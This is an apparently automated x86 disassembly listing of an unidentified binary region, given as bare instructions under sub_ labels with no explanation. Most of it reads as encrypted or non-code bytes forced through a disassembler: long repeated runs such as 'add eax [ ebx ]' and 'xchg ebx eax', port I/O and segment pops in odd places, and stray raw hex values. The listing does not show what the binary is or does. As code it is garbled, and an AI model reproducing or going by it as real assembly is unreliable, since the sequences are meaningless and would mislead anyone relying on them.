add eax [ ebx ]
add eax [ ebx ]
xchg edx eax
xlat
mov bh 0x8b
insb
xlat
mov bh 0x8f
sbb bh dl
mov bh 0x8f
test al 0xd0
mov ebx [ ecx + edx + 0x6c6c4e7b ]
bound ebp [ esp + ebp * 2 + 0x7a ]
mov eax [ 0x36c6c4e ]
add edx [ eax ]
out dx eax
mov bh 0x87
xchg edx eax
pushfd
pop ss
cdq
xchg ebx eax
xchg ebx eax
xchg ebx eax
adc ah ch
mov bl 0x92
pushfd
push ss
adc al 0x87
xchg ebx eax
xchg ebx eax
adc ah ch
sub_465c03
mov al 0x93
xchg ebx eax
adc [ edi - 0x61 ] dl
adc bh dh
mov bh 0x8b
xchg ebx eax
adc ebp esp
xchg edi eax
xchg ebx eax
pushfd
adc eax 0x93938786
adc bh dh
mov bh 0xb7
xchg ebx eax
push ds
xlat
mov bh 0xb7
retn
sub_465c90
mov bh 0x93
xchg ebx eax
stc
cmp [ edx - 0x1e ] 0xffffff84
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add edx [ esi ]
pop edx
pushfd
pop ss
xchg ecx eax
push 0x6c
insb
adc dh ch
fwait
xchg ebx eax
jpe r-xdata
add eax esi
jpe r-xdata
imul ebp [ esp + ebp * 2 + 0x3 ] 0x3
mov al [ 0x3035053 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ss
dec eax
jpe r-xdata
jpo r-xdata
jno r-xdata
arpl [ esp + ebp * 2 + 0x6c ] di
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebp [ esp + eax + 0x7b ]
ja r-xdata
push ds
salc
and eax ebx
jpe r-xdata
insb
add eax [ ebx ]
jpo r-xdata
adc eax 0x9393935b
insb
adc [ edi - 0x79 ] dl
push ss
push ebx
pushfd
pop ss
js r-xdata
xchg ebx eax
xchg ebx eax
int 0x18
push esp
insb
adc [ edi - 0x75 ] dl
int3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
nop
out 0x87 al
shr [ eax + 0x119c9fde ] cl
shl [ ebx + edx * 4 + 0x5418cd93 ] cl
inc edi
fwait
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
sbb dh dl
jns r-xdata
jpe r-xdata
sbb dl [ 0xffffffff9393935b ]
jo r-xdata
0x5316
xchg ebx eax
xchg ebx eax
sti
xchg ebx eax
adc [ ebx + 0x47c57a93 ] 0x6c
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb dl dh
rol bl 0x7b
dec edx
mov al 0x93
xchg ebx eax
jpe r-xdata
push ebp
cmc
sbb dl dh
mov cl 0xcb
stc
jmp r-xdata
pushad
insb
insb
0x505a
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add ebx [ eax ]
salc
insb
outsd
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add esp [ eax - 0x11e50a94 ]
jno r-xdata
fist [ eax + 0x3 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
jb r-xdata
into
mov ecx 0x6c79697a
insb
push ds
pop ss
mov bh 0x3
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
salc
push ebx
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add al 0x7b
xchg edx eax
kmovb k7 k3
and ebp [ 0x246c1fd8 ]
push edi
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ss
sub [ ecx + 0x6c ] 0x6c
mov eax 0xdb97b7d7
push eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
insb
adc [ edi - 0x61 ] dl
sar cl 0x91
insb
lds ebx [ edi + 0x6c7c3b7a ]
insb
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb dl dh
dec edi

sub_465dad
add eax [ ebx ]
add eax [ ebx ]
pushfd
push ss
stosb [ edi ]
jpo r-xdata
fidiv [ edi + 0x18e1f9ca ]
dec edx
cmc
sbb cl dh
mov ch 0x18
dec ebx
cmc
sbb cl dh
mov ebx 0x1af548a0
into
mov ecx 0x6c79697a
insb
push ds
pop ss
mov bh 0x3
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
insb
int 0x50
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
add al 0x7b
xchg ebx eax
xchg ebx eax
xchg ebx eax
push ds
salc
push ebx
retn
sub_465e1f
pop ebx
cmc
sbb bl dh
mov bh 0xca
stc
loope r-xdata
mov bh 0x3
xchg ebx eax
xchg ebx eax
xchg ebx eax
retn
dec edx
cmc
sbb cl dh
mov ch 0x18
dec ebx
cmc
sbb cl dh
mov ebx 0x1af548a0
into
mov ecx 0x6c79697a
insb
push ds
pop ss
sub_465e46
sti
xchg edi eax
xchg edx eax
xchg ebx eax
xchg ebx eax
insb
add eax 0x9393932b
jpe r-xdata
pop ds
outsb
insb
insb
jpo r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
retn
push ss
imul [ esp + ebp * 2 + 0x6c ]
dec ebp
cmc
sbb cl dh
sar [ edx + 0x50 ] 0x9e
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
add eax [ ebx ]
add eax [ ebx ]
push ds
insb
0xa67a
sub_465e5f
lds ebx [ esi ]
push ds
pop ds
outsb
insb
insb
jpo r-xdata
loope r-xdata
jb r-xdata
push ss
imul [ esp + ebp * 2 + 0x6c ]
dec ebp
cmc
sbb cl dh
sar [ edx + 0x50 ] 0x9e
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
add eax [ ebx ]
add eax [ ebx ]
push ds
insb
0xa67a
sub_465e6e
cdq
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ds
salc
jpe r-xdata
cmpsd [ esi ] [ edi ]
0x5316
mov [ ebx + 0x3030393 ] edx
add eax [ ebx ]
add eax eax
adc [ edx + 0x63 ] dl
jpo r-xdata
adc [ ebx - 0x582fe76d ] 0xca
push ss
push ebx
pushfd
pop ss
out 0x46 al
insb
insb
retn
sub_465f07
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx + 0x7a ]
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ ebx + 0xf ]
mov dl 0x93
xchg ebx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
dec esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
in al 0xf5
sbb al dh
pop edi
add edi ecx
sbb dl dh
inc ebx

jpe r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
sbb bl dl
imul edx [ eax - 0x3c3d902a ] 0x6c
out 0x77 al
insb
les ecx [ edi - 0x6c6a3d86 ]
xchg ebx eax
jpo r-xdata
leave
stc
loope r-xdata
insb
insb
0x7aca
sub_465f65
mov ebx 0x393938f
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
in al 0xf5
sbb al dh
pop edi
leave
stc
loope r-xdata
sbb dl dh
inc ebx

sub_465f8b
cmc
sbb dl dh
inc ecx
stc
test bl 0xf5
sbb dl dh
inc edi
mov al [ 0xffffffffc61af553 ]
pop ebp
cmc
sbb dl dh
inc ebp
cmc
sbb bl dh
stc
test bl 0xf9
push ebp
sbb dl dh

sub_465ffb
xchg edx eax
jpe r-xdata
insb
add ebx [ edx ]
salc
inc edi
insb
dec eax
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebx
insb
add al 0x7b
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
stc
test bl 0xf9
push ebp
sbb dl dh

pop esp
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add esi ebp
sbb cl dh
fstp [ eax ]
dec ebx
cmc
sbb cl dh
fistp [ eax ]
dec edx
cmc
sbb cl dh
fstp [ eax ]
dec esp
jpe r-xdata
into
lds ebx [ eax ]
dec ebx
cmc
sbb cl dh

insd
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb cl dh
sub_466054
mov al [ 0xffffffffce1af548 ]
leave
sbb [ ebp + esi * 8 + 0x1a ] cl
into
dec edi
enter 0xfe7a 0x7d
insb
insb
pushfd
and al 0x9a
jpe r-xdata
dec esp
cmc
sbb cl dh
inc esi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
push esp
0xd81e9393 0xc2db
jpe r-xdata
inc ebx
sbb edx esi
push ebx
push ds
fidiv [ edi + 0x1e ]
salc
aaa
push esp
salc
ja r-xdata
bound ebp [ esp + ebp * 2 + 0x7a ]
inc edi
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
pushfd
adc [ edx + 0x1b6c6c48 ] ecx
salc
and ebx [ ebx ]
salc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cmc
sbb cl dh
lds ebx [ eax ]
dec ebx
cmc
sbb cl dh

mov edx 0x3039393
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi [ eax + 0x506b4252 ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x9f al
shr [ ebp + eax * 8 - 0x59 ] 0xc0
insb
lds ebp [ edi - 0x1155ac60 ]
outsd
pushfd
pop es
push ebx
int3
jg r-xdata
salc
arpl [ ebx ] bx
salc
jae r-xdata
fadd st5
ficom [ esi + edx * 8 + 0x47 ]
fdivp st2
sub_46612c
in eax 0x7a
or eax 0xfb6c6c7d
pushad
out 0xf6 eax
rol ah 0x1a
aad 0xcb
jpo r-xdata
add eax [ ebx ]
add edi ecx
js r-xdata
insb
sti
pop esp
js r-xdata
salc
and ebx [ ebx ]
salc
jge r-xdata
jg r-xdata
salc
inc ebx
sbb edx esi
push ebx
push ds
fidiv [ edi + 0x1e ]
salc
aaa
push esp
salc
ja r-xdata
push esp
salc
jpo r-xdata
sbb dl ch
iretd
arpl [ ebx ] bx
salc
jae r-xdata
fadd st5
ficom [ esi + edx * 8 + 0x47 ]
fdivp st2
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
pushfd
adc [ edx + 0x1b6c6c48 ] ecx
out dx al
outsd
pushfd
pop es
push ebx
int3
sub_46614d
insb
sti
pop esi
pop edi
out 0x55 eax
les ebx [ edx ]
adc eax 0x9393931f
jpo r-xdata
add eax [ ebx ]
js r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
sti
jno r-xdata
xor [ esi + 0x3039393 ] cl
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
inc edi
insb
insb
retn
les edi [ edx + 0x2 ]
mov ebx 0x6c039393
add ecx [ edi ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
0x7acb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx - 0xb ] dl
js r-xdata
insb
insb
sti
pushad
out 0xf6 eax
rol ah 0x1a
aad 0xcb
jpo r-xdata
adc [ ebx + 0x507a0393 ] 0xffffffb1
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
inc ecx
insb
insb
add eax [ ebx ]
push ds
push ss
inc edi
outsb
insb
insb
retn
add ebx [ esi ]
insb
add eax [ ebx ]
insb
out 0x83 al
jpe r-xdata
add eax [ ebx ]
add edi ecx
js r-xdata
push ss
inc ecx
pushfd
pop ss
fldcw [ edx + 0x6c ]
insb
pushfd
and al 0x8c
sbb [ ecx - 0x48 ] ah
pop esp
cmc
test al 0x60
pushfd
push ss
xchg [ ebp + 0x44189393 ] cl
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
push edx
cmc
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
sti
pop esp
js r-xdata
cmc
mov [ ebx + 0x3030393 ] dl
add eax [ ebx ]
salc
and ebx [ ebx ]
salc
jge r-xdata
jpo r-xdata
stc
mov bl 0x7a
jg r-xdata
salc
inc ebx
sbb edx esi
push ebx
push ds
fidiv [ edi + 0x1e ]
salc
aaa
push esp
salc
ja r-xdata
push esp
salc
jpo r-xdata
sbb dl ch
iretd
jpe r-xdata
dec edx
insb
insb
arpl [ ebx ] bx
salc
jae r-xdata
fadd st5
ficom [ esi + edx * 8 + 0x47 ]
fdivp st2
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
pushfd
adc [ edx + 0x1b6c6c48 ] ecx
out dx al
outsd
pushfd
pop es
push ebx
int3
jpe r-xdata
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
mov cl 0x93
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
insb
out 0x9f al
jpe r-xdata
sbb dl dh
jpo r-xdata
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
mov cl 0xf5
sbb dl dh
ja r-xdata
add eax [ ebx ]
sbb dh al
lahf
jpo r-xdata
stc
mov bl 0xf5
sbb dl dh
jne r-xdata
stc
mov eax [ 0x7bd61af5 ]

sub_466165
mov eax 0x36c6c7e
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
lds edx [ esi + edx * 8 + 0x7f ]
outsb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
and eax 0x27ac495
mov ebx 0x6c039393
add ecx [ edi ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
insb
insb
sti
pushad
out 0xf6 eax
rol ah 0x1a
aad 0xcb
jpo r-xdata
adc [ ebx + 0x507a0393 ] 0xffffffb1
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
add eax [ ebx ]
add edi ecx
js r-xdata
insb
sti
pop esp
js r-xdata
salc
and ebx [ ebx ]
salc
jge r-xdata
jg r-xdata
salc
inc ebx
sbb edx esi
push ebx
push ds
fidiv [ edi + 0x1e ]
salc
aaa
push esp
salc
ja r-xdata
push esp
salc
jpo r-xdata
sbb dl ch
iretd
arpl [ ebx ] bx
salc
jae r-xdata
fadd st5
ficom [ esi + edx * 8 + 0x47 ]
fdivp st2
add eax [ ebx ]
insb
salc
outsd
adc dh ch
outsd
nop
pushfd
adc [ edx + 0x1b6c6c48 ] ecx
out dx al
outsd
pushfd
pop es
push ebx
int3
sub_4661db
insb
out 0x9b al
jpe r-xdata
dec edx
insb
insb
jpe r-xdata
mov cl 0x93
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
adc [ ebx + 0x3030393 ] 0x3
add eax [ ebx ]
insb
out 0x9f al
jpe r-xdata
push ss
inc ecx
pushfd
pop ss
fldcw [ edx + 0x6c ]
insb
pushfd
and al 0x8c
sbb [ ecx - 0x48 ] ah
pop esp
cmc
test al 0x60
pushfd
push ss
xchg [ ebp + 0x44189393 ] cl
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
inc ecx
insb
insb
add eax [ ebx ]
push ds
sbb dl dh
jpo r-xdata
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
mov cl 0xf5
sbb dl dh
ja r-xdata
jpo r-xdata
stc
mov bl 0x7a
add eax [ ebx ]
sbb dh al
lahf
jpo r-xdata
stc
mov bl 0xf5
sbb dl dh
jne r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx - 0xb ] dl
js r-xdata
xor [ esi + 0x3039393 ] cl
add eax [ ebx ]
add eax [ ebx ]
jpe r-xdata
inc edi
insb
insb
retn
stc
mov eax [ 0x7bd61af5 ]

push ss
inc edi
outsb
insb
insb
retn
add ebx [ esi ]
insb
add eax [ ebx ]
insb
out 0x83 al
jpe r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lds ebx [ eax ]
push edx
cmc
insb
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
cli
push ebx
pop ss
xchg ebx eax
xchg ebx eax
xchg ebx eax
jpe r-xdata
cmc
mov [ ebx + 0x3030393 ] dl
add eax [ ebx ]
sub_4662bc
lea edx [ ebx - 0x7c29e76d ]
adc dh dh
imul edx [ ebx - 0x6c6f2f86 ] 0xffffff93
add eax [ ebx ]
add eax [ ebx ]
add edi [ edx - 0x18 ]
nop
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
pushfd
pop ss
pop ss
jg r-xdata
mov ah 0x93
xchg ebx eax
add eax [ ebx ]
add edi ecx
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx - 0xb ] dl
push ss
inc ecx
pushfd
pop ss
fldcw [ edx + 0x6c ]
insb
pushfd
and al 0x8c
sbb [ ecx - 0x48 ] ah
pop esp
cmc
test al 0x60
pushfd
push ss
xchg [ ebp + 0x44189393 ] cl
jpe r-xdata
stc
fwait
push ds
salc
stc
xchg ebx eax
retn
pop edi
insb
insb
sar cl 0x97
mov bh 0x93
xchg ebx eax
sbb dh bl
fwait
push ds
push ss
imul ebp [ esi + 0x6c ] 0x6c
jpo r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
inc ecx
insb
insb
add eax [ ebx ]
push ds
push ss
inc edi
outsb
insb
insb
retn
jpe r-xdata
stc
xchg edi eax
mov bh 0x93
xchg ebx eax
jpe r-xdata
shl [ eax + 0x4aa67a53 ] cl
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les edi [ edx + 0x12 ]
dec edi
insb
insb
push ds
push ss
arpl [ eax + 0x6c ] bp
insb
jpo r-xdata
add eax [ ebx ]
stc
dec eax
insb
insb
add eax [ ebx ]
mov al [ 0x71d47a53 ]
insb
insb
adc dh dh
outsd
xchg ebx eax
push ds
salc
outsd
retn
sub_466346
insb
inc esp
adc [ ebx - 0x6e ] ch
pushfd
push ss
sbb al 0x91
xchg ebx eax
xchg ebx eax
jpe r-xdata
xchg ebx eax
cmc
sbb al dh
jns r-xdata
xchg ebx eax
xchg ebx eax
fwait
push ds
push ss
imul ebp [ esi + 0x6c ] 0x6c
stc
out 0xf5 al
sbb al dh
jg r-xdata
stc
xchg edi eax
mov bh 0x93
xchg ebx eax
jpe r-xdata
jpo r-xdata
cmc
sbb al dh
jge r-xdata
jg r-xdata
mov ah 0x93
xchg ebx eax
add eax [ ebx ]
add edi ecx
shl [ eax + 0x4aa67a53 ] cl
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
les edi [ edx + 0x12 ]
dec edi
insb
insb
push ds
push ss
arpl [ eax + 0x6c ] bp
insb
jpo r-xdata
add eax [ ebx ]
stc
dec eax
insb
insb
add eax [ ebx ]
mov al [ 0x71d47a53 ]
insb
insb
adc dh dh
outsd
xchg ebx eax
push ds
salc
outsd
retn
jpe r-xdata
mov dl [ ebx + 0x3030393 ]
add eax ebx
push ds
push ss
jg r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax ebp
sbb [ edx - 0xb ] dl
push ss
inc ecx
pushfd
pop ss
fldcw [ edx + 0x6c ]
insb
pushfd
and al 0x8c
sbb [ ecx - 0x48 ] ah
pop esp
cmc
test al 0x60
pushfd
push ss
xchg [ ebp + 0x44189393 ] cl
jpe r-xdata
stc
fwait
push ds
salc
stc
xchg ebx eax
retn
jpe r-xdata
pop edi
insb
insb
sar cl 0x97
mov bh 0x93
xchg ebx eax
sbb dh bl
and al 0x82
adc [ edx - 0x6f ] dl
jpe r-xdata
dec eax
insb
insb
add ebp [ esi - 0x61 ]
sbb dh dl
fwait
insb
retn
outsd
insb
insb
retn
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
inc ecx
insb
insb
add eax [ ebx ]
push ds
push ss
inc edi
outsb
insb
insb
retn
salc
mov cl 0xb6
jmp eax
nop
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
stc
mov bl 0xf5
sbb dl dh
arpl bx cx
stc
mov dh 0xf5
sbb dl dh
popad

sub_4663d5
push esp
xchg ebx eax
xchg ecx eax
xchg ebx eax
xchg edx eax
xchg ebx eax
insb
out 0x7b al
sbb dl dh
imul edi [ edx + 0x6f ] 0x48
insb
insb
add ebp [ esi - 0x61 ]
sbb dh dl
fwait
insb
retn
sub_46644d
popad
insb
insb
add ebx [ esp - 0x6eadef7e ]
jpe r-xdata
salc
mov cl 0xb6
jmp eax
nop
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
stc
mov bl 0xf5
sbb dl dh
arpl bx cx
stc
mov dh 0xf5
sbb dl dh
popad

sub_46649b
push esp
salc
imul esi [ ecx + 0x7ab6b1b3 ] 0xffffff9a
inc eax
insb
insb
add eax [ ebx ]
add ebp [ esp + eax + 0x37 ]
xchg ebx eax
xchg ebx eax
xchg ebx eax
mov al [ 0x7ac8cd53 ]
push 0x3939381
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
insb
out 0x87 al
sbb dh dl
fwait
jpe r-xdata
mov bl 0x54
salc
mov cl 0xb6
jmp eax
outsb
insb
insb
add eax [ ebx ]
retn
sub_4665cd
push ds
push ss
daa
imul ebp [ esp + ebp * 2 + 0x7a ] 0x5d
jb r-xdata
add eax [ ebx ]
jpe r-xdata
insb
push ss
push ebx
jpe r-xdata
cmc
test al 0x42
adc [ ebx + 0x3030393 ] 0x10
stc
sar [ edx + 0x73 ] cl
lahf
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
adc bh [ edi - 0x65 ]
xchg ecx eax
xchg ebx eax
xchg ebx eax
push ds
push ss
imul ebp [ esi + 0x6c ] 0x6c
jpo r-xdata
je r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
jpo r-xdata
pop esp
insb
insb
sbb bh dl
mov bh 0x83
insb
mov [ 0xffffffff93931796 ] eax
xchg ebx eax
jpe r-xdata
insb
add edx [ eax ]
push edi
lahf
stc
xchg ebx eax
sti
xchg ebx eax
xchg ebx eax
xchg ebx eax
fwait
mov dl 0x93
xchg ebx eax
jpe r-xdata
push edx
xchg ecx eax
cmc
adc [ edx - 0x7c27854d ] ch
xchg ebx eax
xchg ebx eax
add ebx ebx
pushfd
and al 0x43
push ds
int 0x97
sub ch [ esp + ebp * 2 - 0x6d ]
xchg ebx eax
sbb cl dh
imul edx [ eax + edx * 4 - 0x35 ] 0xffffffca
0xf5ca
add eax [ ebx ]
add edx [ eax ]
insb
add ebp [ esi - 0x61 ]
pushfd
push ss
dec ebx
insb
insb
insb
sbb dh cl
imul edi [ edx + 0x43 ] 0x79
insb
insb
jpo r-xdata
push ebx
xchg esi eax
clc
dec eax
xchg esi eax
push ebp
xchg edi eax
mov al [ 0x6fce18fb ]
sbb [ eax - 0x30e5bd70 ] cl
mov [ 0x42a8f598 ] eax
jle r-xdata
insb
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
stc
xchg ecx eax
xchg ebx eax
xchg ebx eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
lea edx [ ebx - 0x6fcfc6d ]
jecxz r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add edi ecx
insb
jpe r-xdata
jpe r-xdata
lahf
sbb dl dh
dec ebp

stc
in eax 0xf5
sbb dl dh
jge r-xdata
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
push ebp
insb
insb
add eax [ ebx ]
sbb [ ebp - 0xb ] ch
sbb ch dh
sub eax 0x6c4af87a
insb
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ebx [ esi ]
